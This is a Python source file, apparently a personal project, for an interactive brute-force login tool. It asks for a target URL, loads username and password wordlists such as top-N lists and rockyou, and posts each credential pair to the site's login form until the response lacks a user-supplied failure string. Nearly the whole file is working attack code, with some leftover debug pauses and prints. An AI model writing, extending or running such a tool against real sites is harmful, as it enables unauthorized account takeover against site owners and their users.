# Создать возможность выбора работы с username
# https://humansinc.atlassian.net/
# Создать циклы перебора логин:пароль

import requests
import sys
from termcolor import colored
import pyfiglet


banner = pyfiglet.figlet_format('BruteForce')
print(colored(banner, 'green'))


def passwords_lists(number):
    switcher = {
        '1': ['Passwords/top-10.txt'],
        '2': ['Passwords/top-100.txt'],
        '3': ['Passwords/top-1000.txt'],
        '4': ['Passwords/top-10000.txt'],
        '5': ['Passwords/top-100000.txt'],
        '6': ['Passwords/top-1000000.txt'],
        '7': ['Passwords/rockyou_part1.txt', 'Passwords/rockyou_part2.txt']
    }
    return switcher.get(number)


def usernames_lists(number):
    switcher = {
        1: 'Usernames/top-usernames-shortlist.txt',
        2: 'Usernames/top-1-million-usernames.txt',
        3: 'Usernames/top-10-million-usernames.txt'
    }
    return switcher.get(number)


def request(url):
    try:
        return requests.get(url, timeout=None).status_code
    except requests.exceptions.ConnectionError:
        pass


def bruteforce(username, url, password_file):
    for file in password_file:
        with open(file, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                print(colored(f'Trying - {username}:{password}', 'red'))
                data = {'user_login': username, 'password': password, '_form_action1': 'Login'}
                response = requests.post(url, data=data)
                print(response.content.decode())
                input('plea')
                if login_failed_string in response.content.decode():
                    pass
                else:
                    return f'{username}:{password}'
    else:
        return 'nothing'


try:
    # target_url
    target_url = input('[*] Enter Target URL like http(s)://example.com: ')
    while True:
        if target_url[:8] == 'https://' or target_url[:7] == 'http://':
            if request(target_url) == 200:
                break
            else:
                print(colored('Response of your URL is not 200!', 'red'))
                print('\nCheck your URL')
                target_url = input('[*] Enter Target URL: ')
        else:
            print(colored('Target URL is incorrect!', 'red'))
            print('Target URL should be like', colored('http(s)://example.com', 'green'))
            target_url = input('[*] Enter Target URL: ')

    # username_file or username
    git = 'https://github.com/PodvoyskiyV/BruteForce/tree/main/Usernames'
    print(colored('\nUsernames', 'yellow'))
    print('\nYou have some files to choose:')
    print('top-usernames-shortlist [1], top-1-million-usernames [2], top-10-million-usernames [3]')
    print('View all this files you can at: ', colored(git, 'blue'))
    print('You can write address of your own file [4]')
    print('Or you can write only one Username [5]')
    action_usernames = input('[*] Enter a number corresponding to the variant that you choose: ')
    while True:
        if action_usernames in ['1', '2', '3']:
            username_file = usernames_lists(int(action_usernames))
            break
        elif action_usernames == '4':
            while True:
                try:
                    username_file = input('\n[+] Enter your usernames file address: ')
                    usernames = open(username_file, 'r')
                    usernames.close()
                    break
                except FileNotFoundError:
                    print(colored("This file not exist!", 'red'))
            break
        elif action_usernames == '5':
            username = input('\n[+] Enter Username for the account to bruteforce: ')
            break
        else:
            print(colored("Typed that doesn't match any of the variants!", 'red'))
            print('\nYou have some files to choose:')
            print('top-usernames-shortlist [1], top-1-million-usernames [2], top-10-million-usernames [3]')
            print('You can write address of your own file [4]')
            print('Or you can write only one Username [5]')
            action_usernames = input('[*] Enter a number corresponding to the variant that you choose: ')

    # password_file
    git = 'https://github.com/PodvoyskiyV/BruteForce/tree/main/Passwords'
    print(colored('\nPasswords', 'yellow'))
    print('\nYou have some files to choose:')
    print('top-10 [1], top-100 [2], top-1000 [3], top-10000 [4], top-100000 [5], top-1000000 [6], rockyou [7]')
    print('View all this files you can at: ', colored(git, 'blue'))
    print('You can write address of your own file [8]')
    action_passwords = input('[*] Enter a number corresponding to the variant that you choose: ')
    while True:
        if action_passwords in ['1', '2', '3', '4', '5', '6', '7']:
            password_file = passwords_lists(action_passwords)
            break
        elif action_passwords == '8':
            while True:
                try:
                    password_file = input('\n[+] Enter your passwords file address: ')
                    passwords = open(password_file, 'r')
                    passwords.close()
                    password_file = [password_file]
                    print(password_file)
                    break
                except FileNotFoundError:
                    print(colored("This file not exist!", 'red'))
            break
        else:
            print(colored("Typed that doesn't match any of the variants!", 'red'))
            print('\nYou have some files to choose:')
            print('top-10 [1], top-100 [2], top-1000 [3], top-10000 [4], top-100000 [5], top-1000000 [6], rockyou [7]')
            print('You can write address of your own file [8]')
            action_passwords = input('[*] Enter a number corresponding to the variant that you choose: ')
    login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

    if action_usernames == '5':
        bruteforce(username, target_url, password_file)
    else:
        usernames = open(username_file, 'r')
        for username in usernames:
            username = username.strip()
            credentions = bruteforce(username, target_url, password_file)
            if credentions == 'nothing':
                print(colored(f'Password for user {username} not in this list', 'red'))
            else:
                print(colored(credentions, 'green'))



except KeyboardInterrupt:
    print("\n Program finished by user !!!!")
    sys.exit()

